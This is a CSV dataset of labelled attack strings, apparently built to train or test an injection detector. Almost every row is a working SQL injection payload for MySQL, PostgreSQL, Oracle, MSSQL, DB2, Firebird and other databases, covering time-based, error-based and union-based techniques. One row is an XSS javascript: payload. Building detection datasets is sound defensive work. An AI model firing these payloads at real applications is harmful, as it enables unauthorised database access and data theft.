payload,length,label
"1)));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((3044=3044",120,SQL_INJECTION
"1%"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",69,SQL_INJECTION
"1'+(select 'ewlk' where 1078=1078 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",186,SQL_INJECTION
1' and 1541=6868#,17,SQL_INJECTION
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('fegp'='fegp",65,SQL_INJECTION
"1) as clye where 7842=7842 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",134,SQL_INJECTION
"1%"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""%""=""",167,SQL_INJECTION
"1%' union all select null,null,null,null,null,null#",51,SQL_INJECTION
"1"")) as rpxd where 4929=4929;waitfor delay '0:0:5'--",52,SQL_INJECTION
1) rlike sleep(5),17,SQL_INJECTION
"1'||(select 'ussi' where 8958=8958;select benchmark(5000000,md5(0x4c4d6142)))||'",80,SQL_INJECTION
"1"") and 4595=4595#",18,SQL_INJECTION
"1') union all select null,null,null,null,null,null,null--",57,SQL_INJECTION
"1) or elt(5873=5873,sleep(5))#",30,SQL_INJECTION
"1))) union all select null,null,null,null,null,null,null#",57,SQL_INJECTION
"1');select * from generate_series(3427,3427,case when (3427=7516) then 1 else 0 end) limit 1--",94,SQL_INJECTION
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'mvkg'='mvkg",112,SQL_INJECTION
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null)",69,SQL_INJECTION
"1%') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,SQL_INJECTION
"-5288') or make_set(1164=1710,1710) and ('pkwy'='pkwy",53,SQL_INJECTION
"-1894') union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",70,SQL_INJECTION
"1"") and (4085=4885)*4885 and (""sxte""=""sxte",42,SQL_INJECTION
"1',(select (case when (5249=9648) then 1 else 1/(select 0) end))",64,SQL_INJECTION
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('opll' like 'opll",129,SQL_INJECTION
"1%'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",158,SQL_INJECTION
"1""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""cwpt"" like ""cwpt",136,SQL_INJECTION
-2797'))) union all select 5711#,32,SQL_INJECTION
"1%""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""%""=""",103,SQL_INJECTION
"1'||(select 'ghby' from dual where 4854=4854;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",129,SQL_INJECTION
1') and 8404=8651#,18,SQL_INJECTION
"1 or elt(6272=6272,sleep(5))",28,SQL_INJECTION
1'+(select 'yahd' where 5850=5850;select sleep(5)#,50,SQL_INJECTION
"1')) as peeo where 5356=5356 and elt(4722=2382,2382)--",54,SQL_INJECTION
-2749') as fiho where 3531=3531 or 2777=1485#,45,SQL_INJECTION
"-4586') as shdb where 6176=6176 union all select 6176,6176,6176,6176#",69,SQL_INJECTION
-7041') where 6307=6307 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,118,SQL_INJECTION
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",66,SQL_INJECTION
1')) as jzoh where 6484=6484 and 7364=4233--,44,SQL_INJECTION
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('wyvx'='wyvx",138,SQL_INJECTION
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""mkal"" like ""mkal",113,SQL_INJECTION
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('dkra' like 'dkra",128,SQL_INJECTION
-8397'))) or 2171=4788,22,SQL_INJECTION
"1)) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((8965=8965",110,SQL_INJECTION
"1"" and 2388=benchmark(5000000,md5(0x6d457153))#",47,SQL_INJECTION
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'sloy'='sloy",221,SQL_INJECTION
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('osov' like 'osov",69,SQL_INJECTION
1'+(select 'rpds' where 5870=5870 and 4595=4595#,48,SQL_INJECTION
"1"")) as klie where 2840=2840 or 8514=benchmark(5000000,md5(0x544d5a4c))#",72,SQL_INJECTION
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",234,SQL_INJECTION
"1%"") union all select null#",27,SQL_INJECTION
"1' where 3362=3362;iif(5257=5257,1,1/0)",39,SQL_INJECTION
"-6600') union all select 5566,5566#",35,SQL_INJECTION
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'bxjo' like 'bxjo",125,SQL_INJECTION
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)# mafe",137,SQL_INJECTION
1 where 7021=7021 or 6793=(select 6793 from pg_sleep(5))--,58,SQL_INJECTION
"-5235) or make_set(9354=9354,7185)",34,SQL_INJECTION
1 and 7533=7533,15,SQL_INJECTION
1%'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('%'=',251,SQL_INJECTION
-6109 union all select 6784--,29,SQL_INJECTION
"1) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",100,SQL_INJECTION
1))) or sleep(5) and (((2209=2209,33,SQL_INJECTION
"1%') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",142,SQL_INJECTION
"1"")));waitfor delay '0:0:5'--",29,SQL_INJECTION
1') waitfor delay '0:0:5' and ('fpnh'='fpnh,43,SQL_INJECTION
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('hryb'='hryb",131,SQL_INJECTION
"1"") as hfgk where 1100=1100 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",136,SQL_INJECTION
"1"" where 9829=9829 order by 1#",30,SQL_INJECTION
"1') as nmzp where 3794=3794 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",180,SQL_INJECTION
"1') where 7887=7887 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",113,SQL_INJECTION
"-9572%"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",214,SQL_INJECTION
"1"");begin user_lock.sleep(5); end--",35,SQL_INJECTION
1) order by 1--,15,SQL_INJECTION
"1%""))) and (3502=7893)*7893 and (((""%""=""",40,SQL_INJECTION
"-8448%"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",219,SQL_INJECTION
"-2319 union all select 5068,5068,5068#",38,SQL_INJECTION
"1' where 1085=1085 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",120,SQL_INJECTION
"1%"")) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,SQL_INJECTION
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",69,SQL_INJECTION
"-8425"")) or (6485=1127)*1127 and ((""qruf""=""qruf",47,SQL_INJECTION
"1%') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('%'='",217,SQL_INJECTION
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'tmwy'='tmwy",175,SQL_INJECTION
1 rlike (select * from (select(sleep(5)))sgvo)# ewsz,52,SQL_INJECTION
"1') where 9304=9304 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",81,SQL_INJECTION
1%') and 2006=2006,18,SQL_INJECTION
"1"");select (case when (2676=4191) then 2676 else 1/(select 0) end)--",68,SQL_INJECTION
"1') as wtfo where 5666=5666 union all select null,null,null,null--",66,SQL_INJECTION
1') where 9538=9538;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,113,SQL_INJECTION
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""vnei"" like ""vnei",67,SQL_INJECTION
"-4236') union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",75,SQL_INJECTION
1)) as rcbz where 4563=4563 and 2006=2006,41,SQL_INJECTION
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'xqkq'='xqkq",112,SQL_INJECTION
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""zyoo""=""zyoo",159,SQL_INJECTION
"-8773%'))) union all select 8941,8941,8941,8941,8941,8941#",58,SQL_INJECTION
"1%""))) union all select null,null,null,null,null,null--",55,SQL_INJECTION
"1))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,SQL_INJECTION
1'))) rlike sleep(5) and ((('zwyx'='zwyx,40,SQL_INJECTION
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""mezx"" like ""mezx",226,SQL_INJECTION
"1"") as tqxa where 6751=6751 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",184,SQL_INJECTION
"1%';select benchmark(5000000,md5(0x4c4d6142)) and '%'='",55,SQL_INJECTION
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='",112,SQL_INJECTION
"1))) and 8635=(select count(*) from generate_series(1,5000000))--",65,SQL_INJECTION
"-1684""))) union all select 7473,7473#",37,SQL_INJECTION
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",92,SQL_INJECTION
1) where 3671=3671;(select * from (select(sleep(5)))srmq)--,59,SQL_INJECTION
"1%"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""%""=""",75,SQL_INJECTION
"1%'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",115,SQL_INJECTION
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",90,SQL_INJECTION
1))) or 6793=(select 6793 from pg_sleep(5)) and (((3919=3919,60,SQL_INJECTION
-1219') or 5592=4835,20,SQL_INJECTION
"1') as kgnd where 1550=1550 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",90,SQL_INJECTION
1'+(select ksoh where 6339=6339;begin dbms_lock.sleep(5); end)+',64,SQL_INJECTION
-8636'))) or 4301=7212--,24,SQL_INJECTION
"1%"" rlike sleep(5) and ""%""=""",28,SQL_INJECTION
"1' and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",105,SQL_INJECTION
1') where 8128=8128;select (case when (4061=1396) then 4061 else 1/(select 0) end)--,84,SQL_INJECTION
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ckpm'='ckpm",120,SQL_INJECTION
1' in boolean mode) and (select * from (select(sleep(5)))gcrr)#,63,SQL_INJECTION
-1436' or 5699=5783--,21,SQL_INJECTION
1))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9548=9548,202,SQL_INJECTION
"1 and make_set(8403=8403,8899)",30,SQL_INJECTION
"-4419%"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",140,SQL_INJECTION
1')));(select * from (select(sleep(5)))srmq) and ((('pfle' like 'pfle,69,SQL_INJECTION
1))) order by 1--,17,SQL_INJECTION
1') rlike sleep(5) and ('qsub' like 'qsub,41,SQL_INJECTION
"-1606'||(select 'qbaa' where 3967=3967 union all select 3967,3967,3967,3967,3967--",82,SQL_INJECTION
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""uvzc"" like ""uvzc",145,SQL_INJECTION
"1%') union all select null,null,null,null,null,null,null,null,null,null#",72,SQL_INJECTION
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('ojkd'='ojkd",111,SQL_INJECTION
"-6194"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",208,SQL_INJECTION
1);begin user_lock.sleep(5); end and (4610=4610,47,SQL_INJECTION
"1'))) and elt(2506=2383,2383) and ((('bjrj'='bjrj",49,SQL_INJECTION
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('adnz'='adnz",225,SQL_INJECTION
"1))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6265=6265",82,SQL_INJECTION
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",98,SQL_INJECTION
"1'+(select lgkd where 7801=7801 and elt(4249=4249,7259))+'",58,SQL_INJECTION
1'||(select 'npdx' from dual where 9486=9486 and sleep(5))||',61,SQL_INJECTION
"1%') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('%'='",105,SQL_INJECTION
"-9509) union all select 1193,1193,1193#",39,SQL_INJECTION
"1' in boolean mode) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#",216,SQL_INJECTION
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",142,SQL_INJECTION
"1%' or 8466=benchmark(5000000,md5(0x694a4745)) and '%'='",56,SQL_INJECTION
"1) as oblq where 2002=2002 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",119,SQL_INJECTION
"1'+(select 'ycvl' where 8415=8415 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",142,SQL_INJECTION
"1%"") or 8156=(select count(*) from generate_series(1,5000000))--",64,SQL_INJECTION
1);select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,86,SQL_INJECTION
location=?javascript:alert(1)>click,35,XSS
"1%""));iif(7011=2522,1,1/0)",26,SQL_INJECTION
"1) where 9469=9469 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",160,SQL_INJECTION
"1"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""otgh"" like ""otgh",207,SQL_INJECTION
"-7574%"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",214,SQL_INJECTION
"1"") where 4913=4913;begin user_lock.sleep(5); end--",51,SQL_INJECTION
"-7531') union all select 3072,3072,3072,3072,3072,3072,3072--",61,SQL_INJECTION
"1 union all select null,null,null,null,null,null--",50,SQL_INJECTION
"-4869%' union all select 5729,5729,5729--",41,SQL_INJECTION
"1"" rlike (select * from (select(sleep(5)))vwyq)#",48,SQL_INJECTION
-3613%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',250,SQL_INJECTION
"1'+(select 'myrb' where 3622=3622 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",187,SQL_INJECTION
"1') union all select null,null,null,null,null,null,null,null,null#",66,SQL_INJECTION
"-5863"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""gkvy""=""gkvy",254,SQL_INJECTION
"1 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",110,SQL_INJECTION
"1"")) as ljhz where 2416=2416;begin dbms_lock.sleep(5); end--",60,SQL_INJECTION
"1%""))) and (select * from (select(sleep(5)))gcrr)#",50,SQL_INJECTION
"-8550"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""kyad""=""kyad",205,SQL_INJECTION
1)) as emtf where 3561=3561 or (select * from (select(sleep(5)))ydpu)--,71,SQL_INJECTION
"1' in boolean mode) union all select null,null#",47,SQL_INJECTION
"1'))) union all select null,null#",33,SQL_INJECTION
"1') as sjmt where 6541=6541 or 8421=(select count(*) from generate_series(1,5000000))--",87,SQL_INJECTION
"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""bkrk""=""bkrk",189,SQL_INJECTION
"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",65,SQL_INJECTION
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'sqvt' like 'sqvt,118,SQL_INJECTION
